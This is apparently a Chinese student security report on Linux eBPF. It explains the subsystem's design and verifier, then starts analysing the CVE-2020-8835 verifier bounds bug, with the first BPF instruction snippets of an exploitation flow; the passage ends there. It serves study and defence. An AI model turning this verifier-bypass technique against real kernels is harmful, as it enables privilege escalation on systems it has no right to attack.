<p><span class="twemoji"><svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"></path></svg></span> 约<span class="heti-skip"><span class="heti-spacing"> </span>7477<span class="heti-spacing"> </span></span>个字 <span class="twemoji"><svg viewbox="0 0 576 512" xmlns="http://www.w3.org/2000/svg"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M360.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m64.6 136.1c-12.5 12.5-12.5 32.8 0 45.3l73.4 73.4-73.4 73.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l96-96c12.5-12.5 12.5-32.8 0-45.3l-96-96c-12.5-12.5-32.8-12.5-45.3 0zm-274.7 0c-12.5-12.5-32.8-12.5-45.3 0l-96 96c-12.5 12.5-12.5 32.8 0 45.3l96 96c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l73.3-73.4c12.5-12.5 12.5-32.8 0-45.3z"></path></svg></span> <span>446<span class="heti-spacing"> </span></span>行代码 <span class="twemoji"><svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"></path></svg></span> <span>10<span class="heti-spacing"> </span></span>张图片 <span class="twemoji"><svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"></path></svg></span> 预计阅读时间<span class="heti-skip"><span class="heti-spacing"> </span>30<span class="heti-spacing"> </span></span>分钟</p>
</div>
<div class="admonition abstract">
<p class="admonition-title">Abstract</p>
<p>网络安全大作业报告，同时除去各漏洞具体复现以及<span class="heti-skip"><span class="heti-spacing"> </span>rookit<span class="heti-spacing"> </span></span>部分之外的也作为同学期“计算机科学思想史”的大作业论文。</p>
<p>本文介绍了<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>内核中<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>技术的起源与简介，并介绍了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>的运行逻辑和安全设计，后分析了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>相关的四个漏洞<span><span class="heti-spacing"> </span>CVE-2020-8835</span>、CVE-2020-27194、<span>CVE-2021-3490<span class="heti-spacing"> </span></span>和<span><span class="heti-spacing"> </span>CVE-2022-23222</span>，分析了其原理和利用方式，并提出了<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>常出现的漏洞总结，后基于<span class="heti-skip"><span class="heti-spacing"> </span>CVE-2020-8835<span class="heti-spacing"> </span></span>详细分析了绕过检测后的<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>内核提权利用。最后介绍了基于<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>rootkit<span class="heti-spacing"> </span></span>原理，并复现了<span class="heti-skip"><span class="heti-spacing"> </span>bad-bpf rootkit<span class="heti-spacing"> </span></span>的功能。</p>
</div>
<h2 id="ebpf_1"><span>eBPF<span class="heti-spacing"> </span></span>起源与简介<a class="headerlink" href="#ebpf_1" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
<p><span>eBPF<span class="heti-spacing"> </span></span>是一项革命性的技术，起源于<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>内核，它可以在特权上下文中（如操作系统内核）运行沙盒程序。它用于安全有效地扩展内核的功能，而无需通过更改内核源代码或加载内核模块的方式来实现。</p>
<h3 id="bpf">BPF<a class="headerlink" href="#bpf" title="Permanent link">¶</a></h3>
<p>BPF（Berkeley Packet Filter<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，即伯克利包过滤器，是类<span class="heti-skip"><span class="heti-spacing"> </span>Unix<span class="heti-spacing"> </span></span>系统上数据链路层的一种原始接口，提供原始链路层封包的收发。<span>1992<span class="heti-spacing"> </span></span>年，<span>McCanne<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>Jacbson<span class="heti-spacing"> </span></span>在<span class="heti-skip"><span class="heti-spacing"> </span>USENIX '93<span class="heti-spacing"> </span></span>发表了文章 <em>The BSD packet filter: a new architecture for user-level packet capture</em>，文中介绍了他们在<span class="heti-skip"><span class="heti-spacing"> </span>Unix<span class="heti-spacing"> </span></span>内核实现网络数据包过滤，<span>BPF<span class="heti-spacing"> </span></span>技术比当时最先进的数据包过滤技术快<span class="heti-skip"><span class="heti-spacing"> </span>20<span class="heti-spacing"> </span></span>倍。<span>BPF<span class="heti-spacing"> </span></span>在数据包过滤上引入新虚拟机的设计，并且只缓存与过滤数据包相关的数据，而不是复制数据包的所有信息，这样可以最大程度地减少<span class="heti-skip"><span class="heti-spacing"> </span>BPF<span class="heti-spacing"> </span></span>处理的数据。因为<span class="heti-skip"><span class="heti-spacing"> </span>BPF<span class="heti-spacing"> </span></span>效率提升巨大，绝大多数<span class="heti-skip"><span class="heti-spacing"> </span>*nix<span class="heti-spacing"> </span></span>系统都选择采用<span class="heti-skip"><span class="heti-spacing"> </span>BPF<span class="heti-spacing"> </span></span>作为数据包过滤技术。<span>BPF<span class="heti-spacing"> </span></span>工作在内核中，其结构如下图所示：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img1.png"><img src="/assets/images/sec/syssec/project/img1.png" style="margin: 0 auto;" width="55%"/></a>
</div>
<p>即直接在数据链路层捕获流量包并进行过滤，再返回给用户。<span>BPF<span class="heti-spacing"> </span></span>通过<span><span class="heti-spacing"> </span>JIT</span>（Just-In-Time）及时编译器将<span class="heti-skip"><span class="heti-spacing"> </span>BPF<span class="heti-spacing"> </span></span>指令编译为本机字节码进行执行，以提高执行效率。</p>
<h3 id="ebpf_2">eBPF<a class="headerlink" href="#ebpf_2" title="Permanent link">¶</a></h3>
<p>在<span class="heti-skip"><span class="heti-spacing"> </span>2014<span class="heti-spacing"> </span></span>年，<span>Alexei Starovoitov<span class="heti-spacing"> </span></span>基于先前的<span class="heti-skip"><span class="heti-spacing"> </span>BPF<span class="heti-spacing"> </span></span>实现了<span><span class="heti-spacing"> </span>eBPF</span>（extended Berkeley Packet Filter<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，将原先的只用于网络包过滤的内核态过滤器扩展为了通用的内核字节码执行引擎。</p>
<p><span>eBPF<span class="heti-spacing"> </span></span>最早出现在<span class="heti-skip"><span class="heti-spacing"> </span>Linux 3.18<span class="heti-spacing"> </span></span>内核中，此后原来的<span class="heti-skip"><span class="heti-spacing"> </span>BPF<span class="heti-spacing"> </span></span>就被称为<span><span class="heti-spacing"> </span>cBPF</span>（classic BPF<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，<span>cBPF<span class="heti-spacing"> </span></span>现在已经基本废弃，原有用法也通过<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>重新实现。</p>
<p><span>eBPF<span class="heti-spacing"> </span></span>在<span class="heti-skip"><span class="heti-spacing"> </span>BPF<span class="heti-spacing"> </span></span>指令集的基础上进行了扩展，使用了更多的寄存器与更大的内存空间，并且扩展了在内核执行时可以使用的系统调用。使得开发人员可以使用函数参数自由交换更多的信息，编写更复杂的程序。</p>
<p><span>BPF<span class="heti-spacing"> </span></span>只限于内核态使用，只有少部分用户程序可以编写并创建<span class="heti-skip"><span class="heti-spacing"> </span>BPF<span class="heti-spacing"> </span></span>过滤器，比如<span class="heti-skip"><span class="heti-spacing"> </span>tcpdump<span class="heti-spacing"> </span></span>和<span><span class="heti-spacing"> </span>seccomp</span>。而<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>将其扩展到了用户态，<span>eBPF<span class="heti-spacing"> </span></span>不再局限于网络栈，而是成为了内核中的一个子系统。<span>eBPF<span class="heti-spacing"> </span></span>程序更像一个内核模块，但比内核模块更强调安全和稳定，不需要重新编译内核，也不会造成内核崩溃。</p>
<h2 id="ebpf_3"><span>eBPF<span class="heti-spacing"> </span></span>原理与安全设计<a class="headerlink" href="#ebpf_3" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
<h3 id="ebpf_4"><span>eBPF<span class="heti-spacing"> </span></span>运行逻辑<a class="headerlink" href="#ebpf_4" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p><span>eBPF<span class="heti-spacing"> </span></span>程序是事件驱动的，也就是说，<span>eBPF<span class="heti-spacing"> </span></span>程序通过加载一些钩子（hook）来在某些事件发生的时候触发执行。这些事件包含预定义的系统调用、函数入<span class="heti-skip"><span class="heti-spacing"> </span>/<span class="heti-spacing"> </span></span>出口点、内核跟踪点、网络事件等，除此之外也可以通过创建内核探针（kprobe）或者用户探针（uprobe）来在内核和用户程序的几乎所有位置加载<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img2.png"><img src="/assets/images/sec/syssec/project/img2.png" style="margin: 0 auto;" width="64%"/></a>
</div>
<p>开发者可以通过<span><span class="heti-spacing"> </span>bcc</span>、bpftrace、eBPF Go Library、<span>libbpf<span class="heti-spacing"> </span></span>等各种语言的<span class="heti-skip"><span class="heti-spacing"> </span>SDK<span class="heti-spacing"> </span></span>来编写<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序并编译到<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>字节码。接下来通过<span class="heti-skip"><span class="heti-spacing"> </span>bpf<span class="heti-spacing"> </span></span>系统调用将程序加载入<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>内核中，随后被事件触发进行执行。<span>eBPF<span class="heti-spacing"> </span></span>程序的结果通过<span class="heti-skip"><span class="heti-spacing"> </span>maps<span class="heti-spacing"> </span></span>结构或者<span class="heti-skip"><span class="heti-spacing"> </span>event<span class="heti-spacing"> </span></span>来返回给用户，<span>maps<span class="heti-spacing"> </span></span>是存储<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序所使用的数据结构的空间，需要由用户进程通过<span class="heti-skip"><span class="heti-spacing"> </span>bpf<span class="heti-spacing"> </span></span>系统调用来申请创建，接下来<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序和用户程序都可以访问这块<span><span class="heti-spacing"> </span>map</span>，从而进行数据交换。</p>
<p><span>eBPF<span class="heti-spacing"> </span></span>程序使用一个<span class="heti-skip"><span class="heti-spacing"> </span>RISC<span class="heti-spacing"> </span></span>指令集，可以访问<span class="heti-skip"><span class="heti-spacing"> </span>R0-R10<span class="heti-spacing"> </span></span>这<span class="heti-skip"><span class="heti-spacing"> </span>11<span class="heti-spacing"> </span></span>个寄存器，对应<span class="heti-skip"><span class="heti-spacing"> </span>x64 CPU<span class="heti-spacing"> </span></span>中的<span><span class="heti-spacing"> </span>rax/rdi/rsi/rdx/rcx/r8/rbx/r13/r14/r15/rbp</span>。并且每条指令为以下结构：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-0-1" id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_insn</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-0-2" id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="w">    </span><span class="n">__u8</span><span class="w">    </span><span class="n">code</span><span class="p">;</span><span class="w">       </span><span class="cm">/* opcode */</span>
<a href="#__codelineno-0-3" id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="w">    </span><span class="n">__u8</span><span class="w">    </span><span class="n">dst_reg</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span><span class="w">  </span><span class="cm">/* dest register */</span>
<a href="#__codelineno-0-4" id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="w">    </span><span class="n">__u8</span><span class="w">    </span><span class="n">src_reg</span><span class="o">:</span><span class="mi">4</span><span class="p">;</span><span class="w">  </span><span class="cm">/* source register */</span>
<a href="#__codelineno-0-5" id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="w">    </span><span class="n">__s16</span><span class="w">   </span><span class="n">off</span><span class="p">;</span><span class="w">        </span><span class="cm">/* signed offset */</span>
<a href="#__codelineno-0-6" id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="w">    </span><span class="n">__s32</span><span class="w">   </span><span class="n">imm</span><span class="p">;</span><span class="w">        </span><span class="cm">/* signed immediate constant */</span>
<a href="#__codelineno-0-7" id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="p">};</span>
<a href="#__codelineno-0-8" id="__codelineno-0-8" name="__codelineno-0-8"></a>
<a href="#__codelineno-0-9" id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="c1">// 即类似 BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2) 的形式</span>
</code></pre></div>
<p>加载<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序有以下步骤：</p>
<ul>
<li>调用 <code>syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))</code> 来申请创建一个<span><span class="heti-spacing"> </span>map</span>；</li>
<li>调用 <code>syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))</code> 来加载<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序，<span>attr<span class="heti-spacing"> </span></span>中存储指令数量、首地址和日志级别等属性；<ul>
<li>接下来会进行<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序的验证、编译，并将其加载到内核中；</li>
</ul>
</li>
</ul>
<h3 id="ebpf_5"><span>eBPF<span class="heti-spacing"> </span></span>安全设计<a class="headerlink" href="#ebpf_5" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p><span>eBPF<span class="heti-spacing"> </span></span>作为一种挂载在内核各种位置并在内核态执行的程序，且运行在许多关键软件基础设施组件的核心位置，其安全性至关重要。<span>eBPF<span class="heti-spacing"> </span></span>在加载过程中通过以下过程和机制来保证安全性：</p>
<div style="text-align: center;">
<a class="glightbox" data-desc-position="bottom" data-height="auto" data-type="image" data-width="80%" href="/assets/images/sec/syssec/project/img3.png"><img src="/assets/images/sec/syssec/project/img3.png" style="margin: 0 auto;" width="70%"/></a>
</div>
<ul>
<li>除非启用了非特权<span><span class="heti-spacing"> </span>eBPF</span>，否则只有<span class="heti-skip"><span class="heti-spacing"> </span>root<span class="heti-spacing"> </span></span>用户或授予了<span class="heti-skip"><span class="heti-spacing"> </span>CAP_BPF<span class="heti-spacing"> </span></span>权限的用户才能加载<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序；<ul>
<li>意味着只有受信任的程序才能加载<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序；</li>
<li>而且即使开启了非特权<span><span class="heti-spacing"> </span>eBPF</span>，其对内核的访问功能也会受到限制；</li>
</ul>
</li>
<li>在进行<span class="heti-skip"><span class="heti-spacing"> </span>JIT<span class="heti-spacing"> </span></span>编译前，需要先通过<span class="heti-skip"><span class="heti-spacing"> </span>Verifier<span class="heti-spacing"> </span></span>安全验证，保证了：<ul>
<li>一个<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序一定会运行直至结束，不会阻塞或者无限循环；</li>
<li>程序不能使用未初始化的变量或访问越界内存；</li>
<li>程序必须符合大小限制，并且有有限的复杂性；</li>
</ul>
</li>
<li>在验证后还会进行程序的加固，进行了以下的保护：<ul>
<li>加载后的<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序部分的内存变为只读，即不允许<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序受到任何有意无意的修改；</li>
<li>通过调整内存访问来缓解<span class="heti-skip"><span class="heti-spacing"> </span>Spectre<span class="heti-spacing"> </span></span>分支预测侧信道漏洞；</li>
<li>对代码进行常量盲化（Constant Blinding<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>，防止<span class="heti-skip"><span class="heti-spacing"> </span>JIT<span class="heti-spacing"> </span></span>喷射攻击，防止将可执行代码作为常量注入等；</li>
</ul>
</li>
<li>运行时限制内核内存访问：<ul>
<li><span>eBPF<span class="heti-spacing"> </span></span>不能直接访问任意内核内存，只能通过<span class="heti-skip"><span class="heti-spacing"> </span>helper<span class="heti-spacing"> </span></span>函数来访问程序外的内存，保证了数据一致性；<ul>
<li><span>helper<span class="heti-spacing"> </span></span>是内核提供的一组通用且稳定的<span><span class="heti-spacing"> </span>API</span>，为<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>提供了扩展的功能；</li>
</ul>
</li>
<li><span>eBPF<span class="heti-spacing"> </span></span>通过<span class="heti-skip"><span class="heti-spacing"> </span>Maps<span class="heti-spacing"> </span></span>来存储和检索各种数据结构中的数据，使得程序本身和用户空间都可以进行访问。</li>
</ul>
</li>
</ul>
<h2 id="ebpf_6"><span>eBPF<span class="heti-spacing"> </span></span>技术相关安全漏洞分析<a class="headerlink" href="#ebpf_6" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h2>
<p>虽然<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>通过<span class="heti-skip"><span class="heti-spacing"> </span>Verifier<span class="heti-spacing"> </span></span>等多种手段保证了其安全性，但毕竟其处于内核态运行而且功能代码复杂，所以不可避免的会出现一些漏洞。下面介绍一些<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>曾出现过的漏洞及其基本原理。</p>
<h3 id="cve-2020-8835">CVE-2020-8835<a class="headerlink" href="#cve-2020-8835" title="Permanent link">¶</a></h3>
<p>这个漏洞由<span class="heti-skip"><span class="heti-spacing"> </span>Manfred Paul<span class="heti-spacing"> </span></span>于<span class="heti-skip"><span class="heti-spacing"> </span>2020<span class="heti-spacing"> </span></span>年在<span class="heti-skip"><span class="heti-spacing"> </span>Pwn2Own<span class="heti-spacing"> </span></span>上提出，利用<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>的漏洞是下了<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>系统的提权。漏洞的原理是在<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>进行寄存器检查时带有漏洞，可以使得通过某些指令序列来绕过寄存器值检查。</p>
<p>我们知道<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>会进行程序安全性的检查，其中就包括了访存的合法性检查，为了检查访问的地址，则需要检查寄存器的值，记录其可能出现的值的范围。在代码中，<span>verifier<span class="heti-spacing"> </span></span>通过 <code>bpf_reg_state</code> 结构体来记录寄存器状态，其中包括<span class="heti-skip"><span class="heti-spacing"> </span>{s,u}{min,max}_value<span class="heti-spacing"> </span></span>来记录有无符号下的最大最小值，并用一个 <code>tnum</code> 结构体来保存可能值：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-1-1" id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-1-2" id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-1-3" id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">tnum</span><span class="w"> </span><span class="n">var_off</span><span class="p">;</span>
<a href="#__codelineno-1-4" id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="w">    </span><span class="n">s64</span><span class="w"> </span><span class="n">smin_value</span><span class="p">;</span>
<a href="#__codelineno-1-5" id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="w">    </span><span class="n">s64</span><span class="w"> </span><span class="n">smax_value</span><span class="p">;</span>
<a href="#__codelineno-1-6" id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="w">    </span><span class="n">u64</span><span class="w"> </span><span class="n">umin_value</span><span class="p">;</span>
<a href="#__codelineno-1-7" id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="w">    </span><span class="n">u64</span><span class="w"> </span><span class="n">umax_value</span><span class="p">;</span>
<a href="#__codelineno-1-8" id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-1-9" id="__codelineno-1-9" name="__codelineno-1-9"></a><span class="p">}</span>
<a href="#__codelineno-1-10" id="__codelineno-1-10" name="__codelineno-1-10"></a>
<a href="#__codelineno-1-11" id="__codelineno-1-11" name="__codelineno-1-11"></a><span class="k">struct</span><span class="w"> </span><span class="nc">tnum</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-1-12" id="__codelineno-1-12" name="__codelineno-1-12"></a><span class="w">    </span><span class="n">u64</span><span class="w"> </span><span class="n">value</span><span class="p">;</span><span class="w"> </span><span class="c1">// 某一 bit 为 1，则表示这个 bit 确定为 1</span>
<a href="#__codelineno-1-13" id="__codelineno-1-13" name="__codelineno-1-13"></a><span class="w">    </span><span class="n">u64</span><span class="w"> </span><span class="n">mask</span><span class="p">;</span><span class="w">  </span><span class="c1">// 某一 bit 为 1，则表示这个 bit 的值不确定</span>
<a href="#__codelineno-1-14" id="__codelineno-1-14" name="__codelineno-1-14"></a><span class="p">}</span>
</code></pre></div>
<p>漏洞出现的函数为：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-2-1" id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">__reg_bound_offset32</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_reg_state</span><span class="w"> </span><span class="o">*</span><span class="n">reg</span><span class="p">){</span>
<a href="#__codelineno-2-2" id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="w">    </span><span class="n">u64</span><span class="w"> </span><span class="n">mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xffffFFFF</span><span class="p">;</span>
<a href="#__codelineno-2-3" id="__codelineno-2-3" name="__codelineno-2-3"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">tnum</span><span class="w"> </span><span class="n">range</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tnum_range</span><span class="p">(</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">umin_value</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">,</span>
<a href="#__codelineno-2-4" id="__codelineno-2-4" name="__codelineno-2-4"></a><span class="w">                       </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">umax_value</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">);</span>
<a href="#__codelineno-2-5" id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">tnum</span><span class="w"> </span><span class="n">lo32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tnum_cast</span><span class="p">(</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
<a href="#__codelineno-2-6" id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">tnum</span><span class="w"> </span><span class="n">hi32</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tnum_lshift</span><span class="p">(</span><span class="n">tnum_rshift</span><span class="p">(</span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">),</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
<a href="#__codelineno-2-7" id="__codelineno-2-7" name="__codelineno-2-7"></a>
<a href="#__codelineno-2-8" id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="w">    </span><span class="n">reg</span><span class="o">-&gt;</span><span class="n">var_off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tnum_or</span><span class="p">(</span><span class="n">hi32</span><span class="p">,</span><span class="w"> </span><span class="n">tnum_intersect</span><span class="p">(</span><span class="n">lo32</span><span class="p">,</span><span class="w"> </span><span class="n">range</span><span class="p">));</span>
<a href="#__codelineno-2-9" id="__codelineno-2-9" name="__codelineno-2-9"></a><span class="p">}</span>
</code></pre></div>
<p>这个函数会在进行寄存器<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位操作后更新寄存器状态使用。这里新建了一个<span><span class="heti-spacing"> </span>tnum range</span>，然后根据无符号的范围更新了<span><span class="heti-spacing"> </span>var_off</span>。但这里创建<span class="heti-skip"><span class="heti-spacing"> </span>range<span class="heti-spacing"> </span></span>的时候直接取了<span class="heti-skip"><span class="heti-spacing"> </span>64<span class="heti-spacing"> </span></span>位值的低<span class="heti-skip"><span class="heti-spacing"> </span>32<span class="heti-spacing"> </span></span>位，这样如果无符号的范围是<span><span class="heti-spacing"> </span>0x1 - 0x1_0000_0001</span>，则截断后为<span><span class="heti-spacing"> </span>0x1 - 0x1</span>，这样<span class="heti-skip"><span class="heti-spacing"> </span>var_off<span class="heti-spacing"> </span></span>中就会确定这个寄存器的值一定为<span><span class="heti-spacing"> </span>1</span>。</p>
<p>比如如下利用流程：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-3-1" id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="n">BPF_LDX_MEM</span><span class="p">(</span><span class="n">BPF_DW</span><span class="p">,</span><span class="w"> </span><span class="n">REG_6</span><span class="p">,</span><span class="w"> </span><span class="n">REG_9</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="c1">// r6 = mem[r9+0]</span>
</code></pre></div>
<p>之后<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>因为是从内存中读取出来的值，所以<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>不确定，<code>tnum.value</code> 也就为<span><span class="heti-spacing"> </span>0</span>。接下来我们可以通过操作来使得<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>umin_value<span class="heti-spacing"> </span></span>为<span><span class="heti-spacing"> </span>1</span>：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-4-1" id="__codelineno-4-1" name="__codelineno-4-1"></a><span class="n">BPF_JMP_IMM</span><span class="p">(</span><span class="n">BPF_JGE</span><span class="p">,</span><span class="w"> </span><span class="n">REG_6</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="c1">// if r6 &gt;= 1 goto +1</span>
<a href="#__codelineno-4-2" id="__codelineno-4-2" name="__codelineno-4-2"></a><span class="n">BPF_EXIT_INSN</span><span class="p">()</span><span class="w">                   </span><span class="c1">// exit</span>
</code></pre></div>
